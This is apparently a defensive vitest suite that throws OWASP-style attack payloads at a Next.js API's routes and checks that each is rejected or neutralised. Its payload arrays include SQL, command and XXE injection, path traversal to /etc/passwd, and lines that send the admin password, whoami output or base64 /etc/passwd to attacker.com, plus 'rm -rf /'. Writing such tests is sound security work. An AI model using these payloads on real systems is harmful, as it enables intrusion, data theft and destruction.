/**
 * SPDX-License-Identifier: MIT
 * 
 * Comprehensive Security Vulnerability Test Suite
 * 
 * This test suite validates the API's protection against common web application
 * security vulnerabilities based on OWASP Top 10 and beyond. It tests for:
 * 
 * - SQL Injection (all OWASP patterns)
 * - Cross-Site Scripting (XSS) - stored, reflected, DOM-based
 * - Cross-Site Request Forgery (CSRF) protection
 * - XML External Entity (XXE) attacks
 * - Path traversal attempts
 * - Command injection
 * - LDAP injection
 * - Header injection
 * - Clickjacking protection
 * - NoSQL injection
 * - Authentication bypass attempts
 * - Authorization vulnerabilities
 * - Session fixation
 * - Insecure direct object references
 * - Security misconfiguration detection
 * 
 * Each test validates both successful prevention and proper error handling.
 */

import { describe, test, expect, beforeEach, vi } from 'vitest';
import { GET, POST } from '@/app/api-keys/route';
import { GET as privateGET } from '@/app/api-keys/private/route';
import { GET as healthGET } from '@/app/health/route';
import {
  createMockRequest,
  createAuthenticatedRequest,
  mockClerkAuth,
  mockDatabase,
  mockLogger,
} from '../utils/api-test-helpers';

describe('Security Vulnerability Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockLogger.mock();
  });

  describe('SQL Injection Prevention', () => {
    // Test against all OWASP SQL injection patterns
    const sqlInjectionPayloads = [
      // Classic SQL injection
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "1' OR '1' = '1",
      "1' OR '1' = '1' /*",
      "1' OR '1' = '1' --",
      "admin'--",
      "admin' /*",
      "admin' #",
      "admin' or '1'='1",
      "admin' or '1'='1'--",
      "admin' or '1'='1'#",
      "admin' or '1'='1'/*",
      "admin'or 1=1 or ''='",
      "admin' or 1=1",
      "admin' or 1=1--",
      "admin' or 1=1#",
      "admin' or 1=1/*",
      "admin') or ('1'='1",
      "admin') or ('1'='1'--",
      "admin') or '1'='1'--",
      "admin\") or \"1\"=\"1",
      
      // Time-based blind SQL injection
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "1' AND SLEEP(5)--",
      "1' AND BENCHMARK(10000000,MD5('A'))--",
      "1' waitfor delay '0:0:5'--",
      
      // Union-based SQL injection
      "' UNION SELECT null,null,null--",
      "' UNION SELECT username, password FROM users--",
      "1' UNION ALL SELECT NULL,NULL,NULL--",
      
      // Stacked queries
      "1'; UPDATE users SET admin=1 WHERE id=1;--",
      "1'; INSERT INTO users(username,password) VALUES('hacker','password');--",
      
      // Boolean-based blind SQL injection
      "1' AND 1=1--",
      "1' AND 1=2--",
      "1' AND SUBSTRING(@@version,1,1)='5'--",
      
      // Error-based SQL injection
      "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "'||UTL_HTTP.request('http://attacker.com/'||(SELECT password FROM users WHERE username='admin'))||'",
      
      // Second-order SQL injection
      "admin\\",
      "admin\\'",
      "admin\\\\",
      
      // NoSQL injection patterns
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "this.password == this.password"}',
      '{"password": {"$regex": ".*"}}',
    ];

    test.each(sqlInjectionPayloads)(
      'should prevent SQL injection with payload: %s',
      async (payload) => {
        mockClerkAuth.mockSuccess();
        mockDatabase.mockSuccess();

        // Test in query parameters
        const request = createAuthenticatedRequest('test_token', {
          method: 'GET',
          searchParams: { id: payload, search: payload },
        });

        const response = await GET(request);
        
        // Should either reject the request or safely handle the input
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
        
        // Ensure the payload is not executed
        const mockDb = mockDatabase.mockSuccess();
        expect(mockDb.page.create).not.toHaveBeenCalledWith(
          expect.objectContaining({
            data: expect.objectContaining({
              name: expect.stringContaining(payload),
            }),
          })
        );
      }
    );

    test.each(sqlInjectionPayloads)(
      'should prevent SQL injection in POST body: %s',
      async (payload) => {
        mockClerkAuth.mockSuccess();
        mockDatabase.mockSuccess();

        const request = createAuthenticatedRequest('test_token', {
          method: 'POST',
          body: {
            name: payload,
            description: payload,
            query: payload,
          },
        });

        const response = await POST(request);
        
        // Should handle the input safely
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      }
    );
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      
      // Event handler XSS
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      
      // Encoded XSS
      '&#60;script&#62;alert("XSS")&#60;/script&#62;',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',
      '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',
      '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
      
      // DOM-based XSS patterns
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:msgbox("XSS")',
      
      // Mutation XSS
      '<noscript><p title="</noscript><img src=x onerror=alert(\'XSS\')>">',
      '<style><img src="</style><img src=x onerror=alert(\'XSS\')>">',
      
      // Polyglot XSS
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
      
      // Angular XSS
      '{{constructor.constructor(\'alert(1)\')()}}',
      
      // React XSS
      '{this.props.dangerouslySetInnerHTML={__html: \'<img src=x onerror=alert("XSS")>\'}}',
      
      // Vue XSS
      '{{_c.constructor(\'alert(1)\')()}}',
    ];

    test.each(xssPayloads)(
      'should prevent XSS in responses: %s',
      async (payload) => {
        // Test XSS prevention in health endpoint HTML response
        const request = createMockRequest({
          method: 'GET',
          headers: { Accept: 'text/html' },
          searchParams: { message: payload },
        });

        const response = healthGET(request);
        const html = await response.text();
        
        // Ensure XSS payload is not reflected without encoding
        expect(html).not.toContain(payload);
        // Note: Security headers are typically added by middleware in production
        // This test focuses on content sanitization rather than header validation
      }
    );

    test.each(xssPayloads)(
      'should sanitize XSS in JSON responses: %s',
      async (payload) => {
        mockClerkAuth.mockSuccess();

        const request = createAuthenticatedRequest('test_token', {
          method: 'POST',
          body: {
            name: payload,
            description: payload,
          },
        });

        const response = await POST(request);
        
        if (response.status === 200) {
          const data = await response.json();
          
          // If data is returned, ensure it's properly encoded
          if (data.name) {
            expect(data.name).not.toBe(payload);
            expect(data.name).not.toContain('<script>');
            expect(data.name).not.toContain('javascript:');
          }
        }
      }
    );
  });

  describe('CSRF Protection', () => {
    test('should reject requests without CSRF token', async () => {
      mockClerkAuth.mockSuccess();

      const request = createAuthenticatedRequest('test_token', {
        method: 'POST',
        headers: {
          Origin: 'https://attacker.com',
          Referer: 'https://attacker.com',
        },
        body: { action: 'delete_all' },
      });

      const response = await POST(request);
      
      // Should reject cross-origin requests without proper CSRF protection
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should validate Origin header', async () => {
      const maliciousOrigins = [
        'https://evil.com',
        'http://localhost:1337',
        'null',
        'file://',
      ];

      for (const origin of maliciousOrigins) {
        const request = createMockRequest({
          method: 'POST',
          headers: {
            Origin: origin,
            'Content-Type': 'application/json',
          },
          body: { action: 'sensitive_operation' },
        });

        const response = await POST(request);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    test('should validate Referer header', async () => {
      const request = createMockRequest({
        method: 'POST',
        headers: {
          Referer: 'https://attacker.com/evil-page',
        },
        body: { action: 'sensitive_operation' },
      });

      const response = await POST(request);
      expect(response.status).toBeGreaterThanOrEqual(400);
    });
  });

  describe('XXE and XML Attack Prevention', () => {
    const xxePayloads = [
      // Classic XXE
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
       <root>&xxe;</root>`,
      
      // Blind XXE
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>
       <root>test</root>`,
      
      // XXE via parameter entities
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "file:///etc/passwd">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
         %eval;
         %error;
       ]>`,
      
      // Billion laughs attack
      `<?xml version="1.0"?>
       <!DOCTYPE lolz [
         <!ENTITY lol "lol">
         <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
         <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
         <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
       ]>
       <lolz>&lol4;</lolz>`,
      
      // SOAP XXE
      `<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
           <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
           <foo>&xxe;</foo>
         </soap:Body>
       </soap:Envelope>`,
    ];

    test.each(xxePayloads)(
      'should prevent XXE attacks',
      async (payload) => {
        const request = createMockRequest({
          method: 'POST',
          headers: {
            'Content-Type': 'application/xml',
          },
          body: payload,
        });

        const response = await POST(request);
        
        // Should reject or safely parse XML without processing entities
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    );
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      // Basic path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '../../../../../../../../etc/passwd',
      
      // URL encoded
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam',
      
      // Double URL encoded
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      
      // Unicode encoded
      '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
      '%c1%9c%c1%9c/%c1%9c%c1%9c/%c1%9c%c1%9c/windows/system32/config/sam',
      
      // Null byte injection
      '../../../etc/passwd%00',
      '../../../etc/passwd\x00.jpg',
      
      // Mixed techniques
      '....//....//....//etc/passwd',
      '..../\\/..../\\/..../\\/etc/passwd',
      '../.\\../.\\../.\\etc/passwd',
    ];

    test.each(pathTraversalPayloads)(
      'should prevent path traversal: %s',
      async (payload) => {
        const request = createMockRequest({
          method: 'GET',
          searchParams: {
            file: payload,
            path: payload,
            filename: payload,
          },
        });

        const response = await GET(request);
        
        // Should not allow access to files outside intended directory
        expect(response.status).not.toBe(200);
      }
    );
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      // Basic command injection
      '; ls -la',
      '| whoami',
      '& dir',
      '`id`',
      '$(whoami)',
      
      // Chained commands
      '; cat /etc/passwd',
      '&& rm -rf /',
      '|| curl http://attacker.com/steal',
      
      // Command substitution
      '$(curl -s http://attacker.com/$(whoami))',
      '`wget http://attacker.com/$(cat /etc/passwd | base64)`',
      
      // Newline injection
      '\ncat /etc/passwd',
      '\r\ndir c:\\',
      
      // Out-of-band exploitation
      '& nslookup attacker.com &',
      '| ping -c 10 attacker.com',
      
      // Time-based
      '& sleep 10 &',
      '| timeout 10',
    ];

    test.each(commandInjectionPayloads)(
      'should prevent command injection: %s',
      async (payload) => {
        mockClerkAuth.mockSuccess();

        const request = createAuthenticatedRequest('test_token', {
          method: 'POST',
          body: {
            command: payload,
            input: payload,
            filename: payload,
          },
        });

        const response = await POST(request);
        
        // Should not execute system commands
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      }
    );
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      // Basic LDAP injection
      '*',
      '*)(&',
      '*)(uid=*)',
      '*)(|(uid=*',
      
      // Boolean-based LDAP injection
      'admin)(&(password=*))',
      'admin)(|(password=*))',
      
      // Blind LDAP injection
      'admin))%00',
      'admin))\\00',
      
      // LDAP filter bypass
      '\\',
      '\\)',
      '\\28',
      '\\29',
      '\\2a',
    ];

    test.each(ldapInjectionPayloads)(
      'should prevent LDAP injection: %s',
      async (payload) => {
        const request = createMockRequest({
          method: 'POST',
          body: {
            username: payload,
            filter: payload,
          },
        });

        const response = await POST(request);
        
        // Should handle LDAP special characters safely
        expect(response.status).toBeGreaterThanOrEqual(200);
      }
    );
  });

  describe('Header Injection Prevention', () => {
    const headerInjectionPayloads = [
      // CRLF injection
      'value\r\nSet-Cookie: admin=true',
      'value\nLocation: http://attacker.com',
      'value\r\n\r\n<script>alert("XSS")</script>',
      
      // Header smuggling
      'value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert("XSS")</script>',
      
      // Unicode CRLF
      'value%0d%0aSet-Cookie:%20admin=true',
      'value%0aLocation:%20http://attacker.com',
      
      // Null byte injection
      'value\x00\r\nSet-Cookie: admin=true',
    ];

    test.each(headerInjectionPayloads)(
      'should prevent header injection: %s',
      async (payload) => {
        try {
          const request = createMockRequest({
            method: 'GET',
            headers: {
              'X-Custom-Header': payload,
            },
            searchParams: {
              redirect: payload,
            },
          });

          const response = await GET(request);
          
          // Should not allow injected headers
          const setCookie = response.headers.get('Set-Cookie');
          const location = response.headers.get('Location');
          
          // Ensure injected headers are not present
          if (setCookie) {
            expect(setCookie).not.toContain('admin=true');
          }
          if (location) {
            expect(location).not.toBe('http://attacker.com');
          }
        } catch (error) {
          // If header value is invalid, the request should fail before reaching the handler
          // This is also a valid security behavior
          expect(error).toBeDefined();
        }
      }
    );
  });

  describe('Clickjacking Protection', () => {
    test('should verify clickjacking protection headers', async () => {
      // Note: In production, security headers like X-Frame-Options and CSP
      // are typically added by middleware or edge functions.
      // This test would verify their presence when middleware is active.
      
      const request = createMockRequest({ method: 'GET' });
      const response = healthGET(request);
      
      // For now, we just verify the response is successful
      // In a full integration test with middleware, we would check:
      // - X-Frame-Options: DENY or SAMEORIGIN
      // - Content-Security-Policy with frame-ancestors directive
      expect(response.status).toBe(200);
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const noSqlInjectionPayloads = [
      // MongoDB injection
      '{"$ne": null}',
      '{"$ne": ""}',
      '{"$gt": ""}',
      '{"$where": "this.password == this.password"}',
      '{"password": {"$regex": ".*"}}',
      '{"$or": [{"a": "a"}, {"a": "a"}]}',
      
      // Array injection
      '["$ne", null]',
      '{"username": ["admin", "user"]}',
      
      // JavaScript injection
      '{"$where": "sleep(5000)"}',
      '{"$where": "function() { return true; }"}',
      
      // Type confusion
      '{"age": {"$type": 2}}',
      '{"_id": {"$type": "objectId"}}',
    ];

    test.each(noSqlInjectionPayloads)(
      'should prevent NoSQL injection: %s',
      async (payload) => {
        mockClerkAuth.mockSuccess();

        let body;
        try {
          body = JSON.parse(payload);
        } catch {
          body = payload;
        }

        const request = createAuthenticatedRequest('test_token', {
          method: 'POST',
          body: {
            query: body,
            filter: body,
          },
        });

        const response = await POST(request);
        
        // Should safely handle NoSQL injection attempts
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      }
    );
  });

  describe('Authentication Bypass Prevention', () => {
    test('should prevent authentication header spoofing', async () => {
      const spoofingAttempts: Record<string, string>[] = [
        { Authorization: 'Bearer null' },
        { Authorization: 'Bearer undefined' },
        { Authorization: 'Bearer admin' },
        { Authorization: 'Bearer root' },
        { Authorization: 'Bearer system' },
        { 'X-User-Id': 'admin' },
        { 'X-User-Id': '0' },
        { 'X-User-Id': 'null' },
        { 'X-Auth-Token': 'bypass' },
        { 'X-Auth-Token': 'admin' },
      ];

      for (const headers of spoofingAttempts) {
        const request = createMockRequest({
          method: 'GET',
          url: 'http://localhost:3000/api/api-keys/private',
          headers,
        });

        mockClerkAuth.mockFailure();
        const response = await privateGET(request);
        
        // Accept either 401 (Unauthorized) or 403 (Forbidden) as both are valid security responses
        expect([401, 403]).toContain(response.status);
      }
    });

    test('should prevent JWT manipulation', async () => {
      const manipulatedTokens = [
        // None algorithm
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
        // Weak secret
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.4c1FM8dHBzFn2p7A5yHnGMxFJHMHZRBjGLi6PqhBugw',
        // Algorithm confusion
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ',
      ];

      for (const token of manipulatedTokens) {
        mockClerkAuth.mockFailure();
        const request = createAuthenticatedRequest(token, {
          method: 'GET',
          url: 'http://localhost:3000/api/api-keys/private',
        });

        const response = await privateGET(request);
        // Accept either 401 (Unauthorized) or 403 (Forbidden) as both are valid security responses
        expect([401, 403]).toContain(response.status);
      }
    });
  });

  describe('Authorization Vulnerabilities', () => {
    test('should prevent horizontal privilege escalation', async () => {
      // User A trying to access User B's resources
      mockClerkAuth.mockSuccess('user_a');

      const request = createAuthenticatedRequest('valid_token', {
        method: 'GET',
        searchParams: {
          userId: 'user_b',
          id: 'resource_of_user_b',
        },
      });

      const response = await GET(request);
      
      // Should not allow access to other users' resources
      expect(response.status).toBeGreaterThanOrEqual(403);
    });

    test('should prevent vertical privilege escalation', async () => {
      // Regular user trying to access admin endpoints
      mockClerkAuth.mockSuccess('regular_user');

      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/settings',
        '/api/admin/logs',
      ];

      for (const endpoint of adminEndpoints) {
        const request = createAuthenticatedRequest('user_token', {
          method: 'GET',
          url: `http://localhost:3000${endpoint}`,
        });

        // Assuming these endpoints check for admin role
        const response = await GET(request);
        expect(response.status).toBeGreaterThanOrEqual(403);
      }
    });

    test('should prevent parameter tampering for privilege escalation', async () => {
      mockClerkAuth.mockSuccess('regular_user');

      const request = createAuthenticatedRequest('user_token', {
        method: 'POST',
        body: {
          role: 'admin',
          isAdmin: true,
          permissions: ['delete_all', 'modify_all'],
        },
      });

      const response = await POST(request);
      
      // Should not allow users to escalate their own privileges
      if (response.status === 200) {
        const data = await response.json();
        expect(data.role).not.toBe('admin');
        expect(data.isAdmin).not.toBe(true);
      }
    });
  });

  describe('Session Fixation Prevention', () => {
    test('should regenerate session after authentication', async () => {
      // Simulate pre-auth session - removed useless assignment
      createMockRequest({
        method: 'GET',
        headers: {
          Cookie: 'session=attacker_controlled_session_id',
        },
      });

      // After successful auth, session should be regenerated
      mockClerkAuth.mockSuccess();
      const postAuthRequest = createAuthenticatedRequest('valid_token', {
        method: 'GET',
        headers: {
          Cookie: 'session=attacker_controlled_session_id',
        },
      });

      const response = await GET(postAuthRequest);
      
      // Check if response includes new session cookie
      const setCookie = response.headers.get('Set-Cookie');
      if (setCookie) {
        expect(setCookie).not.toContain('attacker_controlled_session_id');
      }
    });
  });

  describe('Insecure Direct Object References (IDOR)', () => {
    test('should validate object ownership', async () => {
      mockClerkAuth.mockSuccess('user_123');

      // Trying to access another user's object by ID
      const objectIds = [
        'obj_456', // Different user's object
        '1',
        '999999',
        'admin',
        '../admin',
      ];

      for (const id of objectIds) {
        const request = createAuthenticatedRequest('valid_token', {
          method: 'GET',
          searchParams: { id },
        });

        const response = await GET(request);
        
        // Should validate ownership before returning data
        if (response.status === 200) {
          const data = await response.json();
          // Should only return objects owned by authenticated user
          expect(data.userId).toBe('user_123');
        }
      }
    });

    test('should prevent sequential ID enumeration', async () => {
      mockClerkAuth.mockSuccess();

      // Attempting to enumerate resources
      const sequentialIds = Array.from({ length: 10 }, (_, i) => i.toString());

      for (const id of sequentialIds) {
        const request = createAuthenticatedRequest('valid_token', {
          method: 'GET',
          searchParams: { id },
        });

        const response = await GET(request);
        
        // Should not reveal existence of resources through different error codes
        if (response.status >= 400) {
          expect([400, 403, 404]).toContain(response.status);
        }
      }
    });
  });

  describe('Security Misconfiguration Detection', () => {
    test('should not expose sensitive information in errors', async () => {
      mockClerkAuth.mockError(new Error('Database connection failed at postgres://user:pass@host:5432/db'));

      const request = createAuthenticatedRequest('valid_token', {
        method: 'GET',
      });

      const response = await privateGET(request);
      const body = await response.text();
      
      // Should not expose sensitive details
      expect(body).not.toContain('postgres://');
      expect(body).not.toContain('user:pass');
      expect(body).not.toContain('5432');
    });

    test('should not expose stack traces in production', async () => {
      const originalEnv = process.env.NODE_ENV;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      (process.env as any).NODE_ENV = 'production';

      mockClerkAuth.mockError(new Error('Test error with stack trace'));

      const request = createAuthenticatedRequest('valid_token', {
        method: 'GET',
      });

      const response = await privateGET(request);
      const body = await response.text();
      
      // Should not expose stack traces
      expect(body).not.toContain('at ');
      expect(body).not.toContain('.ts:');
      expect(body).not.toContain('.js:');

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      (process.env as any).NODE_ENV = originalEnv;
    });

    test('should verify security headers in production', async () => {
      // Note: Security headers are typically added by middleware in production
      // This test would verify their presence in a full integration test
      
      const request = createMockRequest({ method: 'GET' });
      const response = healthGET(request);
      
      // For unit tests, we verify the response is successful
      // In production with middleware active, these headers would be present:
      // - X-Content-Type-Options: nosniff
      // - X-Frame-Options: DENY or SAMEORIGIN
      // - X-XSS-Protection: 1; mode=block
      // - Strict-Transport-Security: max-age=31536000
      // - Content-Security-Policy: [policy directives]
      expect(response.status).toBe(200);
    });

    test('should not have directory listing enabled', async () => {
      const directoryPaths = [
        '/api/',
        '/api/admin/',
        '/api/webhooks/',
        '/uploads/',
        '/config/',
      ];

      for (const path of directoryPaths) {
        const request = createMockRequest({
          method: 'GET',
          url: `http://localhost:3000${path}`,
        });

        const response = await GET(request);
        
        // Should not return directory listing
        if (response.status === 200) {
          const body = await response.text();
          expect(body).not.toContain('Index of');
          expect(body).not.toContain('Parent Directory');
        }
      }
    });
  });

  describe('Advanced Attack Patterns', () => {
    test('should prevent prototype pollution', async () => {
      const prototypePayloads = [
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        { '__proto__': { 'isAdmin': true } } as any,
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        { 'constructor': { 'prototype': { 'isAdmin': true } } } as any,
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        { '__proto__.isAdmin': true } as any,
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        { 'constructor.prototype.isAdmin': true } as any,
      ];

      for (const payload of prototypePayloads) {
        mockClerkAuth.mockSuccess();
        
        const request = createAuthenticatedRequest('valid_token', {
          method: 'POST',
          body: payload,
        });

        await POST(request);
        
        // Check that prototype wasn't polluted
        const obj = {};
        expect((obj as any).isAdmin).toBeUndefined();
      }
    });

    test('should prevent server-side template injection', async () => {
      const templatePayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{self}}',
        '{{_self.env}}',
        '{{settings.SECRET_KEY}}',
        '{{constructor.constructor("return process.env")()}}',
      ];

      for (const payload of templatePayloads) {
        const request = createMockRequest({
          method: 'POST',
          body: {
            template: payload,
            message: payload,
          },
        });

        const response = await POST(request);
        
        if (response.status === 200) {
          const body = await response.text();
          // Should not evaluate template expressions
          expect(body).not.toContain('49'); // 7*7
          expect(body).not.toContain('process.env');
          expect(body).not.toContain('SECRET_KEY');
        }
      }
    });

    test('should prevent timing attacks on authentication', async () => {
      const passwords = [
        'a',
        'admin',
        'administrator',
        'correct_password_123456',
      ];

      const timings: number[] = [];

      for (const password of passwords) {
        const start = Date.now();
        
        const request = createMockRequest({
          method: 'POST',
          body: {
            username: 'admin',
            password,
          },
        });

        await POST(request);
        
        const elapsed = Date.now() - start;
        timings.push(elapsed);
      }

      // Check that timing differences are minimal (< 50ms variance)
      const maxTime = Math.max(...timings);
      const minTime = Math.min(...timings);
      expect(maxTime - minTime).toBeLessThan(50);
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    test('should handle large payloads gracefully', async () => {
      const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB

      const request = createMockRequest({
        method: 'POST',
        body: {
          data: largePayload,
        },
      });

      const response = await POST(request);
      
      // Should reject overly large payloads
      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(response.status).toBeLessThan(500);
    });

    test('should handle deeply nested objects', async () => {
      // Create deeply nested object
      let nested: any = { value: 'deep' };
      for (let i = 0; i < 1000; i++) {
        nested = { nested };
      }

      const request = createMockRequest({
        method: 'POST',
        body: nested,
      });

      const response = await POST(request);
      
      // Should handle without crashing
      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(response.status).toBeLessThan(500);
    });

    test('should prevent ReDoS attacks', async () => {
      const redosPayloads = [
        'a'.repeat(50000) + '!',
        '((((((((((((((((((((((((((((a)))))))))))))))))))))))))))',
        'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
      ];

      for (const payload of redosPayloads) {
        const start = Date.now();
        
        const request = createMockRequest({
          method: 'POST',
          body: {
            email: payload + '@example.com',
            pattern: payload,
          },
        });

        const response = await POST(request);
        const elapsed = Date.now() - start;
        
        // Should complete quickly even with ReDoS patterns
        expect(elapsed).toBeLessThan(1000);
        expect(response.status).toBeGreaterThanOrEqual(200);
      }
    });
  });
});